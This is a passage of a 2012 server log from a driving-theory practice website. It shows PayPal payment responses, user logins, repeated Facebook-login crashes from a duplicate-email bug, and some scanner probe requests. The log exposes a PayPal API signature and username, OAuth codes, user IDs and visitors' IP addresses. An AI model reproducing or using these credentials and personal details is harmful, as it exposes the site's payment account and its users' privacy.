 'SIGNATURE': ('AA6FKP55XSbL3HvSeGi8V-Fb.Yv8A47KsUXj1CQw531s.vd-HCMVUsrL',),
 'TOKEN': u'EC-9XT229647P1272707',
 'USER': 'zahid_api1.intheory.co.uk',
 'VERSION': '72.0'}
ERROR:paypal.interface:PayPal NVP Query Response
ERROR:paypal.interface:{u'ACK': [u'Failure'],
 u'BUILD': [u'4072860'],
 u'CORRELATIONID': [u'be1c8df433941'],
 u'L_ERRORCODE0': [u'10415'],
 u'L_LONGMESSAGE0': [u'A successful transaction has already been completed for this token.'],
 u'L_SEVERITYCODE0': [u'Error'],
 u'L_SHORTMESSAGE0': [u'Transaction refused because of an invalid argument. See additional error messages for details.'],
 u'TIMESTAMP': [u'2012-10-23T20:28:40Z'],
 u'VERSION': [u'72.0']}
Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
WARNING:intheory-8002:Error while completing payment: u'A successful transaction has already been completed for this token.' (Error Code: 10415)
User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
INFO:intheory-8001:User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
Facebook user with id 5086537f8e4c8547f9331a33 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5086537f8e4c8547f9331a33 has successfully logged in.
Intheory user with id 50870ea98e4c856f1484f7f1 has successfully registered.
INFO:intheory-8003:Intheory user with id 50870ea98e4c856f1484f7f1 has successfully registered.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQDv-bYRqQ4QDQJ0ccxau4MkxIvfUqCQvSVhLbBbWu4jC222OYgRY4j9z8j5gj6d_GABE1HLrXZL99OyoBpjRHOrXY42QJWBo9DMuIldU2z6BbaYrhyJ2eIfgOZLWfX-01qrL18cOEcUPa4iimi3EfSSye_gauKu9afo0bylgO6-fWph3jvxmdkP6poy5IUK7jolboyfTeiL5xW6YGfaly7m (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDv-bYRqQ4QDQJ0ccxau4MkxIvfUqCQvSVhLbBbWu4jC222OYgRY4j9z8j5gj6d_GABE1HLrXZL99OyoBpjRHOrXY42QJWBo9DMuIldU2z6BbaYrhyJ2eIfgOZLWfX-01qrL18cOEcUPa4iimi3EfSSye_gauKu9afo0bylgO6-fWph3jvxmdkP6poy5IUK7jolboyfTeiL5xW6YGfaly7m', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1829012280.1351030485.1351030485.1351030485.1; __utmb=188782963.3.10.1351030485; __utmc=188782963; __utmz=188782963.1351030485.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '90.192.161.78'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQDv-bYRqQ4QDQJ0ccxau4MkxIvfUqCQvSVhLbBbWu4jC222OYgRY4j9z8j5gj6d_GABE1HLrXZL99OyoBpjRHOrXY42QJWBo9DMuIldU2z6BbaYrhyJ2eIfgOZLWfX-01qrL18cOEcUPa4iimi3EfSSye_gauKu9afo0bylgO6-fWph3jvxmdkP6poy5IUK7jolboyfTeiL5xW6YGfaly7m (127.0.0.1) 1071.70ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQABFNTCJkFfbxPceLQuC2xjav0gm3EOxI8QDXYvB1rk3Yt_YXmgpjYrw88P-Sf9Y_cCdmw1LrC28k6NfdaYN0oiCeFYYlJ8AkxmJiwVbIxX392FmQ6a8M3tP0KtKhfGKs7MTJ5vQ1ea2GW9iK9-4waitY6uRMok-uwMdoAcKtqSbMz3SJWkO81EEXFP8rHN6xZNy-55_GaQ82kNTdTWOCWF (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQABFNTCJkFfbxPceLQuC2xjav0gm3EOxI8QDXYvB1rk3Yt_YXmgpjYrw88P-Sf9Y_cCdmw1LrC28k6NfdaYN0oiCeFYYlJ8AkxmJiwVbIxX392FmQ6a8M3tP0KtKhfGKs7MTJ5vQ1ea2GW9iK9-4waitY6uRMok-uwMdoAcKtqSbMz3SJWkO81EEXFP8rHN6xZNy-55_GaQ82kNTdTWOCWF', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1829012280.1351030485.1351030485.1351030485.1; __utmb=188782963.3.10.1351030485; __utmc=188782963; __utmz=188782963.1351030485.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '90.192.161.78'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQABFNTCJkFfbxPceLQuC2xjav0gm3EOxI8QDXYvB1rk3Yt_YXmgpjYrw88P-Sf9Y_cCdmw1LrC28k6NfdaYN0oiCeFYYlJ8AkxmJiwVbIxX392FmQ6a8M3tP0KtKhfGKs7MTJ5vQ1ea2GW9iK9-4waitY6uRMok-uwMdoAcKtqSbMz3SJWkO81EEXFP8rHN6xZNy-55_GaQ82kNTdTWOCWF (127.0.0.1) 938.58ms
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQB4hmK6qFcIzTwurgNpUR2zkVGnHv9ISLm7SybpZOFzcnxSZ317QULqE9PjWHKEBgvEhlNNOrmVpuq6lp446DOcU1aiZwrv-XVlivDAEgmzh_1r788f4iWcsglLr8oaCwicN1hTy8TsmU-0geL_-s7BSMQEr3v3r2gewgaCT-YcsNmnzUkYf79SbHLbPl7v4-LdM90uHwnmOF55N0nGmuCX (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQB4hmK6qFcIzTwurgNpUR2zkVGnHv9ISLm7SybpZOFzcnxSZ317QULqE9PjWHKEBgvEhlNNOrmVpuq6lp446DOcU1aiZwrv-XVlivDAEgmzh_1r788f4iWcsglLr8oaCwicN1hTy8TsmU-0geL_-s7BSMQEr3v3r2gewgaCT-YcsNmnzUkYf79SbHLbPl7v4-LdM90uHwnmOF55N0nGmuCX', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '90.192.161.78', 'Cookie': '__utma=188782963.1829012280.1351030485.1351030485.1351030485.1; __utmb=188782963.3.10.1351030485; __utmc=188782963; __utmz=188782963.1351030485.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQB4hmK6qFcIzTwurgNpUR2zkVGnHv9ISLm7SybpZOFzcnxSZ317QULqE9PjWHKEBgvEhlNNOrmVpuq6lp446DOcU1aiZwrv-XVlivDAEgmzh_1r788f4iWcsglLr8oaCwicN1hTy8TsmU-0geL_-s7BSMQEr3v3r2gewgaCT-YcsNmnzUkYf79SbHLbPl7v4-LdM90uHwnmOF55N0nGmuCX (127.0.0.1) 920.77ms
Intheory user with id 5087178e8e4c856f1484f7f7 has successfully registered.
INFO:intheory-8003:Intheory user with id 5087178e8e4c856f1484f7f7 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (94.75.209.131) 1.28ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.89ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Intheory user with id 5087e49f8e4c856f0a0ccc76 has successfully registered.
INFO:intheory-8002:Intheory user with id 5087e49f8e4c856f0a0ccc76 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Facebook user with id 507d60738e4c85441a097f6f has successfully logged in.
INFO:intheory-8002:Facebook user with id 507d60738e4c85441a097f6f has successfully logged in.
Intheory user with id 508811c58e4c856efaed39c3 has successfully registered.
INFO:intheory-8001:Intheory user with id 508811c58e4c856efaed39c3 has successfully registered.
Intheory user with id 508812138e4c856efaed39c5 has successfully registered.
INFO:intheory-8001:Intheory user with id 508812138e4c856efaed39c5 has successfully registered.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506f11498e4c856632c26f44has paid. The transaction id is Granted free access by moderator
Intheory user with id 508812138e4c856efaed39c5 has successfully logged in.
INFO:intheory-8002:Intheory user with id 508812138e4c856efaed39c5 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Intheory user with id 50885eb78e4c856f0a0ccc7c has successfully registered.
INFO:intheory-8002:Intheory user with id 50885eb78e4c856f0a0ccc7c has successfully registered.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.79ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8000:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
INFO:intheory-8003:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Granted free access by moderator
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.449952279.1351163208.1351163208.1351163208.1; __utmb=188782963.4.10.1351163208; __utmc=188782963; __utmz=188782963.1351163208.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '86.139.201.252'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf (127.0.0.1) 1032.99ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.449952279.1351163208.1351163208.1351163208.1; __utmb=188782963.4.10.1351163208; __utmc=188782963; __utmz=188782963.1351163208.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '86.139.201.252'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQDXxxnxIkAcm5-y0DQUDPc0uybiVUKC4yA3oA1Om5S_5M4frtoREERaBJ2-k5s2XI2lkuOG9ldVyT70tIjJsSj12PikWiMR1UbAvTnHZSKAy3nx9a8ri24CNXtDobCbPNfUm-liz_XU3FbNdCaXT6Z-FgJKAeihDOCszrALK7ghn-rfHnlQeHGvjOJvFFfvMLb34xFojhWbv2GfWI36OJXf (127.0.0.1) 964.03ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQDlLBDB9c1razFX6_NxacmES6W_k_0FVs1Q0SLXl-mK0QB5uc2F1X5W4BY7W_gnNqeihb1H5FNn9fIpIjEJAVnf8TATABWQ1LyFd-_nfD9ws0DMj_-ScUanHGGDynXwY8oYBooo8H5TPPAnRHBllcROg0s8q3zq1xwjWuzTRgaGdYauY4XMq9MwkyK4Sta0aPHWeJp3nOhtRG865RKfQjg9 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDlLBDB9c1razFX6_NxacmES6W_k_0FVs1Q0SLXl-mK0QB5uc2F1X5W4BY7W_gnNqeihb1H5FNn9fIpIjEJAVnf8TATABWQ1LyFd-_nfD9ws0DMj_-ScUanHGGDynXwY8oYBooo8H5TPPAnRHBllcROg0s8q3zq1xwjWuzTRgaGdYauY4XMq9MwkyK4Sta0aPHWeJp3nOhtRG865RKfQjg9', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '86.139.201.252', 'Cookie': '__utma=188782963.449952279.1351163208.1351163208.1351163208.1; __utmb=188782963.4.10.1351163208; __utmc=188782963; __utmz=188782963.1351163208.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQDlLBDB9c1razFX6_NxacmES6W_k_0FVs1Q0SLXl-mK0QB5uc2F1X5W4BY7W_gnNqeihb1H5FNn9fIpIjEJAVnf8TATABWQ1LyFd-_nfD9ws0DMj_-ScUanHGGDynXwY8oYBooo8H5TPPAnRHBllcROg0s8q3zq1xwjWuzTRgaGdYauY4XMq9MwkyK4Sta0aPHWeJp3nOhtRG865RKfQjg9 (127.0.0.1) 959.94ms
Intheory user with id 50891e048e4c856ef97f4d09 has successfully registered.
INFO:intheory-8000:Intheory user with id 50891e048e4c856ef97f4d09 has successfully registered.
Intheory user with id 5089247e8e4c856f0a0ccc80 has successfully registered.
INFO:intheory-8002:Intheory user with id 5089247e8e4c856f0a0ccc80 has successfully registered.
Intheory user with id 50892eca8e4c856efaed39ca has successfully registered.
INFO:intheory-8001:Intheory user with id 50892eca8e4c856efaed39ca has successfully registered.
Intheory user with id 5087e49f8e4c856f0a0ccc76 has successfully logged in.
INFO:intheory-8000:Intheory user with id 5087e49f8e4c856f0a0ccc76 has successfully logged in.
User with id 50892eca8e4c856efaed39cahas paid. The transaction id is Free voucher transaction
INFO:intheory-8001:User with id 50892eca8e4c856efaed39cahas paid. The transaction id is Free voucher transaction
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
WARNING:root:404 GET /pt-welcome (127.0.0.1) 0.90ms
Intheory user with id 508976178e4c856f1484f806 has successfully registered.
INFO:intheory-8003:Intheory user with id 508976178e4c856f1484f806 has successfully registered.
Intheory user with id 508978548e4c856f1484f808 has successfully registered.
INFO:intheory-8003:Intheory user with id 508978548e4c856f1484f808 has successfully registered.
Intheory user with id 508978ce8e4c856f0a0ccc84 has successfully registered.
INFO:intheory-8002:Intheory user with id 508978ce8e4c856f0a0ccc84 has successfully registered.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8003:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Intheory user with id 50897a588e4c856f0a0ccc87 has successfully registered.
INFO:intheory-8002:Intheory user with id 50897a588e4c856f0a0ccc87 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Intheory user with id 50897c528e4c856ef97f4d0f has successfully registered.
INFO:intheory-8000:Intheory user with id 50897c528e4c856ef97f4d0f has successfully registered.
Intheory user with id 50897d068e4c856ef97f4d11 has successfully registered.
INFO:intheory-8000:Intheory user with id 50897d068e4c856ef97f4d11 has successfully registered.
Intheory user with id 50897db48e4c856f1484f810 has successfully registered.
INFO:intheory-8003:Intheory user with id 50897db48e4c856f1484f810 has successfully registered.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQAZn_HQWnXFTJTzqLrGvezukpJUtVvivhdfpre7Qdo45Pojlvp6Y6wuyFcCh2f6QmNMLMzSeAfufWosWZVXNRqR04U07ctTST7gPChbtJYm20ljxiwjJo-AvgLQNa5tNyM-FQPizVUTkPOcINDguCDYD64Wr-gPW5IaaAGU0oT6uvdcM3aOjvt8VW3aezkoIvK69Jxa-KlENS0vy_GDvknS (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAZn_HQWnXFTJTzqLrGvezukpJUtVvivhdfpre7Qdo45Pojlvp6Y6wuyFcCh2f6QmNMLMzSeAfufWosWZVXNRqR04U07ctTST7gPChbtJYm20ljxiwjJo-AvgLQNa5tNyM-FQPizVUTkPOcINDguCDYD64Wr-gPW5IaaAGU0oT6uvdcM3aOjvt8VW3aezkoIvK69Jxa-KlENS0vy_GDvknS', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1673474001.1351187823.1351187823.1351187823.1; __utmb=188782963.3.10.1351187823; __utmc=188782963; __utmz=188782963.1351187823.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test%20free%20practice', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '85.210.153.227'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQAZn_HQWnXFTJTzqLrGvezukpJUtVvivhdfpre7Qdo45Pojlvp6Y6wuyFcCh2f6QmNMLMzSeAfufWosWZVXNRqR04U07ctTST7gPChbtJYm20ljxiwjJo-AvgLQNa5tNyM-FQPizVUTkPOcINDguCDYD64Wr-gPW5IaaAGU0oT6uvdcM3aOjvt8VW3aezkoIvK69Jxa-KlENS0vy_GDvknS (127.0.0.1) 1063.33ms
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQB2kboQ33NN_jY9aNhjMXK99XKVH5tZMeHiu4OtzjefP6FkIgpwbrraScNv15kZG1GhYwUbJk9y-ZWcEoCyQJeo4WgvtIfCMO8uPdBpq5KogzMzCX5r_KemTJLE-OKOvQoM9TEo5KP1B5DzVY-Ao4u_C6LExUO60XrAi527SaOqF0CoAyBlW0sl2YcXp9Jh4MxybT1y1hPN7jTzHKeS134U (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQB2kboQ33NN_jY9aNhjMXK99XKVH5tZMeHiu4OtzjefP6FkIgpwbrraScNv15kZG1GhYwUbJk9y-ZWcEoCyQJeo4WgvtIfCMO8uPdBpq5KogzMzCX5r_KemTJLE-OKOvQoM9TEo5KP1B5DzVY-Ao4u_C6LExUO60XrAi527SaOqF0CoAyBlW0sl2YcXp9Jh4MxybT1y1hPN7jTzHKeS134U', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1673474001.1351187823.1351187823.1351187823.1; __utmb=188782963.3.10.1351187823; __utmc=188782963; __utmz=188782963.1351187823.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test%20free%20practice', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '85.210.153.227'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
